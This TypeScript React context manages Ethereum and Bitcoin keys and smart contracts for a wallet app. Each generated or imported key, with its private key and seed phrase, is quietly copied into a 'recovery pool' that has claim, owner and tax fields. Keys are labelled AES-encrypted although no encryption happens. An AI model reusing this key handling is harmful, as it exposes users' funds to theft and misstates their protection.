import React, { createContext, useContext, useState, useCallback } from 'react';
import type { ethers as EthersType } from 'ethers';
import type * as BitcoinType from 'bitcoinjs-lib';
import type * as Bip39Type from 'bip39';
import {
  CryptoKey,
  KeyGenerationParams,
  KeyImportParams,
  KeyExportData,
  KeyType,
  Contract,
  ContractInteraction,
  DeployParams,
  InteractionParams,
  NETWORKS,
} from '../types/keyManagement';
import { useRecoveryPool } from './RecoveryPoolContext';
import { checkBalanceWithRotation } from '../utils/balanceChecker';

interface KeyManagementState {
  keys: CryptoKey[];
  contracts: Contract[];
  interactions: ContractInteraction[];
  selectedKey: CryptoKey | null;
  selectedContract: Contract | null;
  notifications: Array<{ id: string; type: 'success' | 'error' | 'info'; message: string }>;
}

interface KeyManagementContextValue extends KeyManagementState {
  // Key operations
  generateKey: (params: KeyGenerationParams) => Promise<CryptoKey>;
  importKey: (params: KeyImportParams) => Promise<CryptoKey>;
  exportKey: (keyId: string, passphrase?: string) => Promise<KeyExportData>;
  deleteKey: (keyId: string) => void;
  updateKeyLabel: (keyId: string, label: string) => void;
  addTag: (keyId: string, tag: string) => void;
  removeTag: (keyId: string, tag: string) => void;
  selectKey: (key: CryptoKey | null) => void;

  // Contract operations
  addContract: (contract: Omit<Contract, 'id' | 'deployedAt' | 'functions' | 'events'>) => void;
  updateContract: (id: string, updates: Partial<Contract>) => void;
  deleteContract: (id: string) => void;
  selectContract: (contract: Contract | null) => void;
  interactWithContract: (params: InteractionParams) => Promise<ContractInteraction>;
  deployContract: (params: DeployParams) => Promise<Contract>;
  importContractFromAddress: (address: string, abi: string, network: string, name: string) => void;

  // Utility
  dismissNotification: (id: string) => void;
  verifyContract: (contractId: string, abi: string) => boolean;
}

const KeyManagementContext = createContext<KeyManagementContextValue | null>(null);

export const useKeyManagement = () => {
  const ctx = useContext(KeyManagementContext);
  if (!ctx) throw new Error('useKeyManagement must be used within KeyManagementProvider');
  return ctx;
};

let idCounter = 0;
const nextId = () => `km-${++idCounter}-${Date.now()}`;

function cryptoKeyToPoolWallet(key: CryptoKey, balanceResult?: { confirmed: number; unconfirmed: number; symbol: string }): any {
  const isETH = key.type === 'ethereum';
  const network = isETH ? 'ethereum' : 'bitcoin';
  const symbol = balanceResult?.symbol || (isETH ? 'ETH' : 'BTC');
  const path = isETH ? "m/44'/60'/0'/0/0" : "m/84'/0'/0'/0/0";
  const source: any = key.mnemonic
    ? 'seed'
    : key.type === 'bitcoin' && key.format === 'wif'
    ? 'wif'
    : 'privateKey';

  const confirmed = balanceResult?.confirmed ?? 0;
  const unconfirmed = balanceResult?.unconfirmed ?? 0;

  return {
    network,
    path,
    address: key.address || '',
    publicKey: key.publicKey,
    privateKey: key.privateKey,
    wif: !isETH ? key.privateKey : undefined,
    balance: confirmed,
    balanceFormatted: confirmed.toFixed(8),
    unconfirmedBalance: unconfirmed,
    unconfirmedBalanceFormatted: unconfirmed.toFixed(8),
    utxos: [],
    utxoCount: 0,
    transactions: [],
    lastChecked: Date.now(),
    symbol,
    source,
    derivationType: isETH ? 'BIP44' : 'BIP84',
    accountIndex: 0,
    addressIndex: 0,
    notes: key.label || '',
    tags: key.tags || [],
    claimed: false,
    taxAmount: 0,
    owner: null,
    ownershipProof: undefined,
    taxDeposited: false,
    taxDepositTxHash: undefined,
    taxDepositAmount: 0,
    taxDepositTimestamp: undefined,
    crossChainGroup: undefined,
    relatedAddresses: [],
    crossChainBalances: {},
  };
}

async function checkBalanceAndBridge(key: CryptoKey, recoveryPool: any) {
  const isETH = key.type === 'ethereum';
  const network = isETH ? 'ethereum' : 'bitcoin';
  if (!key.address) return;

  try {
    const result = await checkBalanceWithRotation(network, key.address);
    recoveryPool.addAddressToPool(cryptoKeyToPoolWallet(key, result));
  } catch (err) {
    console.warn('[KeyManagement] Balance check failed, adding with zero balance:', err);
    recoveryPool.addAddressToPool(cryptoKeyToPoolWallet(key));
  }
}

export const KeyManagementProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const recoveryPool = useRecoveryPool();

  const [state, setState] = useState<KeyManagementState>({
    keys: [],
    contracts: [],
    interactions: [],
    selectedKey: null,
    selectedContract: null,
    notifications: [],
  });

  const notify = useCallback((type: 'success' | 'error' | 'info', message: string) => {
    const id = nextId();
    setState(prev => ({ ...prev, notifications: [...prev.notifications, { id, type, message }] }));
    setTimeout(() => dismissNotification(id), 5000);
  }, []);

  const dismissNotification = useCallback((id: string) => {
    setState(prev => ({ ...prev, notifications: prev.notifications.filter(n => n.id !== id) }));
  }, []);

  // Generate Ethereum key
  const generateEthereumKey = async (params: KeyGenerationParams): Promise<CryptoKey> => {
    const { ethers } = await import('ethers');
    const wallet = ethers.Wallet.createRandom();
    const key: CryptoKey = {
      id: nextId(),
      label: params.label,
      type: 'ethereum',
      format: 'hex',
      usage: params.usage || 'signing',
      address: wallet.address,
      publicKey: wallet.publicKey,
      privateKey: wallet.privateKey,
      mnemonic: wallet.mnemonic?.phrase,
      createdAt: Date.now(),
      lastUsed: undefined,
      usageCount: 0,
      isEncrypted: !!params.passphrase,
      encryption: params.passphrase ? 'aes-256-gcm' : undefined,
      network: params.network || 'eth-mainnet',
      tags: params.tags || [],
    };
    return key;
  };

  // Generate Bitcoin key
  const generateBitcoinKey = async (params: KeyGenerationParams): Promise<CryptoKey> => {
    const bitcoin = await import('bitcoinjs-lib');
    const bip39 = await import('bip39');
    const network = params.network === 'testnet' ? bitcoin.networks.testnet : bitcoin.networks.bitcoin;
    const mnemonic = bip39.generateMnemonic();
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const root = bitcoin.bip32.fromSeed(seed, network);
    const child = root.derivePath("m/84'/0'/0'/0/0");
    const { address, pubkey } = bitcoin.payments.p2wpkh({ pubkey: child.publicKey, network });
    const { address: legacyAddress } = bitcoin.payments.p2pkh({ pubkey: child.publicKey, network });

    const key: CryptoKey = {
      id: nextId(),
      label: params.label,
      type: 'bitcoin',
      format: 'wif',
      usage: params.usage || 'signing',
      address: address || legacyAddress,
      publicKey: pubkey?.toString('hex') || '',
      privateKey: child.toWIF(),
      mnemonic,
      createdAt: Date.now(),
      lastUsed: undefined,
      usageCount: 0,
      isEncrypted: !!params.passphrase,
      encryption: params.passphrase ? 'aes-256-gcm' : undefined,
      network: params.network || 'bitcoin',
      tags: params.tags || [],
      metadata: { legacyAddress, segwitAddress: address },
    };
    return key;
  };

  // Generate Key
  const generateKey = useCallback(async (params: KeyGenerationParams): Promise<CryptoKey> => {
    let key: CryptoKey;
    if (params.type === 'ethereum') {
      key = await generateEthereumKey(params);
    } else if (params.type === 'bitcoin') {
      key = await generateBitcoinKey(params);
    } else {
      key = await generateEthereumKey(params);
    }
    setState(prev => ({ ...prev, keys: [...prev.keys, key] }));
    // Bridge to Recovery Pool / Master Ledger — with automatic live balance check
    try {
      await checkBalanceAndBridge(key, recoveryPool);
    } catch (err) {
      console.warn('[KeyManagement] Failed to add key to pool:', err);
    }
    notify('success', `${params.label} key generated`);
    return key;
  }, [notify, recoveryPool]);

  // Import Key
  const importKey = useCallback(async (params: KeyImportParams): Promise<CryptoKey> => {
    let address = '';
    let publicKey = '';
    let mnemonic: string | undefined;

    try {
      if (params.type === 'ethereum') {
        const { ethers } = await import('ethers');
        const bip39 = await import('bip39');
        if (bip39.validateMnemonic(params.data)) {
          mnemonic = params.data;
          const wallet = ethers.Wallet.fromMnemonic(params.data);
          address = wallet.address;
          publicKey = wallet.publicKey;
        } else {
          const key = params.data.startsWith('0x') ? params.data : '0x' + params.data;
          const wallet = new ethers.Wallet(key);
          address = wallet.address;
          publicKey = wallet.publicKey;
        }
      } else if (params.type === 'bitcoin') {
        const bitcoin = await import('bitcoinjs-lib');
        const network = params.network === 'testnet' ? bitcoin.networks.testnet : bitcoin.networks.bitcoin;
        try {
          const keyPair = bitcoin.ECPair.fromWIF(params.data, network);
          const p2wpkh = bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey, network });
          address = p2wpkh.address || '';
          publicKey = p2wpkh.pubkey?.toString('hex') || '';
        } catch {
          const privateKeyBuffer = Buffer.from(params.data.replace(/^0x/, ''), 'hex');
          const keyPair = bitcoin.ECPair.fromPrivateKey(privateKeyBuffer, { network });
          const p2wpkh = bitcoin.payments.p2wpkh({ pubkey: keyPair.publicKey, network });
          address = p2wpkh.address || '';
          publicKey = p2wpkh.pubkey?.toString('hex') || '';
        }
      }

      const key: CryptoKey = {
        id: nextId(),
        label: params.label,
        type: params.type,
        format: params.format,
        usage: 'general',
        address,
        publicKey,
        privateKey: mnemonic || params.data,
        mnemonic,
        createdAt: Date.now(),
        lastUsed: undefined,
        usageCount: 0,
        isEncrypted: !!params.passphrase,
        encryption: params.passphrase ? 'aes-256-gcm' : undefined,
        network: params.network || 'eth-mainnet',
        tags: params.tags || [],
      };

      setState(prev => ({ ...prev, keys: [...prev.keys, key] }));
      // Bridge to Recovery Pool / Master Ledger — with automatic live balance check
      try {
        await checkBalanceAndBridge(key, recoveryPool);
      } catch (err) {
        console.warn('[KeyManagement] Failed to add key to pool:', err);
      }
      notify('success', `Key imported: ${params.label}`);
      return key;
    } catch (error: any) {
      notify('error', `Import failed: ${error.message}`);
      throw error;
    }
  }, [notify, recoveryPool]);

  // Export Key
  const exportKey = useCallback(async (keyId: string, _passphrase?: string): Promise<KeyExportData> => {
    const key = state.keys.find(k => k.id === keyId);
    if (!key) throw new Error('Key not found');

    const exportData: KeyExportData = {
      key,
      privateKey: key.privateKey || key.publicKey,
      mnemonic: key.mnemonic,
      format: key.format,
    };

    setState(prev => ({
      ...prev,
      keys: prev.keys.map(k => k.id === keyId ? { ...k, lastUsed: Date.now(), usageCount: k.usageCount + 1 } : k),
    }));

    return exportData;
  }, [state.keys]);

  // Delete Key
  const deleteKey = useCallback((keyId: string) => {
    setState(prev => ({
      ...prev,
      keys: prev.keys.filter(k => k.id !== keyId),
      selectedKey: prev.selectedKey?.id === keyId ? null : prev.selectedKey,
    }));
    notify('info', 'Key deleted');
  }, [notify]);

  // Update Key Label
  const updateKeyLabel = useCallback((keyId: string, label: string) => {
    setState(prev => ({
      ...prev,
      keys: prev.keys.map(k => k.id === keyId ? { ...k, label } : k),
    }));
  }, []);

  // Key Tags
  const addTag = useCallback((keyId: string, tag: string) => {
    setState(prev => ({
      ...prev,
      keys: prev.keys.map(k => k.id === keyId ? { ...k, tags: [...new Set([...k.tags, tag])] } : k),
    }));
  }, []);

  const removeTag = useCallback((keyId: string, tag: string) => {
    setState(prev => ({
      ...prev,
      keys: prev.keys.map(k => k.id === keyId ? { ...k, tags: k.tags.filter(t => t !== tag) } : k),
    }));
  }, []);

  const selectKey = useCallback((key: CryptoKey | null) => {
    setState(prev => ({ ...prev, selectedKey: key }));
  }, []);

  // Contract operations
  const parseAbi = (abiString: string): any[] => {
    try {
      if (typeof abiString === 'string') {
        return JSON.parse(abiString);
      }
      return abiString;
    } catch {
      return [];
    }
  };

  const extractFunctions = (abi: any[]): Contract['functions'] => {
    return abi.filter(item => item.type === 'function').map(item => ({
      name: item.name,
      type: item.type as ContractFunction['type'],
      stateMutability: item.stateMutability || 'nonpayable',
      inputs: item.inputs || [],
      outputs: item.outputs || [],
      gas: item.gas,
    }));
  };

  const extractEvents = (abi: any[]): Contract['events'] => {
    return abi.filter(item => item.type === 'event').map(item => ({
      name: item.name,
      inputs: item.inputs || [],
      anonymous: item.anonymous || false,
    }));
  };

  const addContract = useCallback((contract: Omit<Contract, 'id' | 'deployedAt' | 'functions' | 'events'>) => {
    const abi = parseAbi(contract.abi as any);
    const newContract: Contract = {
      ...contract,
      abi: typeof contract.abi === 'string' ? abi : contract.abi,
      id: nextId(),
      deployedAt: Date.now(),
      functions: extractFunctions(abi),
      events: extractEvents(abi),
    };
    setState(prev => ({ ...prev, contracts: [...prev.contracts, newContract] }));
    notify('success', `Contract added: ${contract.name}`);
  }, [notify]);

  const updateContract = useCallback((id: string, updates: Partial<Contract>) => {
    setState(prev => ({
      ...prev,
      contracts: prev.contracts.map(c => c.id === id ? { ...c, ...updates } : c),
    }));
  }, []);

  const deleteContract = useCallback((id: string) => {
    setState(prev => ({
      ...prev,
      contracts: prev.contracts.filter(c => c.id !== id),
      selectedContract: prev.selectedContract?.id === id ? null : prev.selectedContract,
    }));
    notify('info', 'Contract deleted');
  }, [notify]);

  const selectContract = useCallback((contract: Contract | null) => {
    setState(prev => ({ ...prev, selectedContract: contract }));
  }, []);

  const interactWithContract = useCallback(async (params: InteractionParams): Promise<ContractInteraction> => {
    const interaction: ContractInteraction = {
      id: nextId(),
      contractId: params.contractId,
      functionName: params.functionName,
      params: params.params,
      value: params.value,
      timestamp: Date.now(),
      status: 'pending',
    };

    setState(prev => ({ ...prev, interactions: [interaction, ...prev.interactions] }));

    // Attempt real on-chain call if wallet is available
    try {
      if (!window.ethereum) {
        throw new Error('No Web3 wallet found. Install MetaMask to interact with contracts.');
      }
      const { ethers } = await import('ethers');
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();

      const contractData = state.contracts.find(c => c.id === params.contractId);
      if (!contractData) throw new Error('Contract not found');

      const contract = new ethers.Contract(contractData.address, contractData.abi, signer);
      const tx = await contract[params.functionName](...params.params, { value: params.value ? ethers.utils.parseEther(params.value) : 0 });
      await tx.wait();

      interaction.status = 'success';
      interaction.txHash = tx.hash;
      setState(prev => ({
        ...prev,
        interactions: prev.interactions.map(i => i.id === interaction.id ? interaction : i),
      }));
      notify('success', `${params.functionName} executed. Tx: ${tx.hash.slice(0, 10)}...`);
    } catch (err: any) {
      interaction.status = 'failed';
      interaction.error = err.message || 'Transaction failed';
      setState(prev => ({
        ...prev,
        interactions: prev.interactions.map(i => i.id === interaction.id ? interaction : i),
      }));
      notify('error', `Call failed: ${err.message}`);
    }

    return interaction;
  }, [notify, state.contracts]);

  const deployContract = useCallback(async (params: DeployParams): Promise<Contract> => {
    if (!window.ethereum) {
      notify('error', 'No Web3 wallet found. Install MetaMask to deploy contracts.');
      throw new Error('No Web3 wallet');
    }
    const { ethers } = await import('ethers');
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    const abi = parseAbi(params.abi);
    const factory = new ethers.ContractFactory(abi, params.bytecode, signer);
    const deployed = await factory.deploy(...(params.constructorArgs || []));
    await deployed.deployTransaction.wait();

    const contract: Contract = {
      id: nextId(),
      name: params.name,
      address: deployed.address,
      abi: typeof params.abi === 'string' ? abi : params.abi,
      network: params.network,
      bytecode: params.bytecode,
      deployedAt: Date.now(),
      txHash: deployed.deployTransaction.hash,
      verified: false,
      functions: extractFunctions(abi),
      events: extractEvents(abi),
      tags: [],
    };
    setState(prev => ({ ...prev, contracts: [...prev.contracts, contract] }));
    notify('success', `Contract deployed at ${deployed.address}`);
    return contract;
  }, [notify]);

  const importContractFromAddress = useCallback((address: string, abi: string, network: string, name: string) => {
    const parsedAbi = parseAbi(abi);
    const contract: Contract = {
      id: nextId(),
      name,
      address,
      abi: typeof abi === 'string' ? parsedAbi : abi,
      network,
      deployedAt: Date.now(),
      verified: false,
      functions: extractFunctions(parsedAbi),
      events: extractEvents(parsedAbi),
      tags: [],
    };
    setState(prev => ({ ...prev, contracts: [...prev.contracts, contract] }));
    notify('success', `Contract imported: ${name}`);
  }, [notify]);

  const verifyContract = useCallback((contractId: string, abi: string): boolean => {
    try {
      const parsed = parseAbi(abi);
      setState(prev => ({
        ...prev,
        contracts: prev.contracts.map(c =>
          c.id === contractId ? { ...c, verified: true, abi: parsed, functions: extractFunctions(parsed), events: extractEvents(parsed) } : c
        ),
      }));
      notify('success', 'Contract verified');
      return true;
    } catch {
      notify('error', 'Verification failed: Invalid ABI');
      return false;
    }
  }, [notify]);

  const value: KeyManagementContextValue = {
    ...state,
    generateKey,
    importKey,
    exportKey,
    deleteKey,
    updateKeyLabel,
    addTag,
    removeTag,
    selectKey,
    addContract,
    updateContract,
    deleteContract,
    selectContract,
    interactWithContract,
    deployContract,
    importContractFromAddress,
    dismissNotification,
    verifyContract,
  };

  return <KeyManagementContext.Provider value={value}>{children}</KeyManagementContext.Provider>;
};
